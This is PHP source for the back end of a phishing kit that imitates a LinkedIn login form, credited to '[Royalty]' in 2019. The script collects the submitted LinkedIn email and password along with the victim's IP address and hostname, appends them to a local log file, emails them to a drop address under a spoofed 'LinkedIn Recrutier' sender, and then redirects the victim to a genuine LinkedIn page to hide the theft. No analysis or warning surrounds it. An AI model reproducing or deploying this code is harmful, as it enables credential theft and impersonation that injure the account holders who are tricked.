<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "---------------+ Email & Password +--------------\n";
$message .= "Linkedin email : ".$_POST['session_key']."\n";
$message .= "Linkedin Password : ".$_POST['session_password']."\n";
$message .= "----------------------------------------------\n";
$message .= "--------------+ Connction info +------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "----------------------------------------------\n";
$message .= "----------------------------------------------\n";
$rnessage  = "$message\n";
$message .= "-----------+ Created in 2019 By [Royalty] +----------\n";


@fclose(@fwrite(@fopen("LinkedIn-Login.txt", "a"),$message));

$send="email@gmail.com";  //change email address for result//

$subject = "||LinkedIn Logins||$ip ";
$headers = "From: LinkedIn Recrutier<rezult@linkin.com>";
if(mail($send,$subject,$rnessage,$headers) != false){
Header ("Location:https://www.linkedin.com/showcase/linkedin-talent-solutions");
}
?>
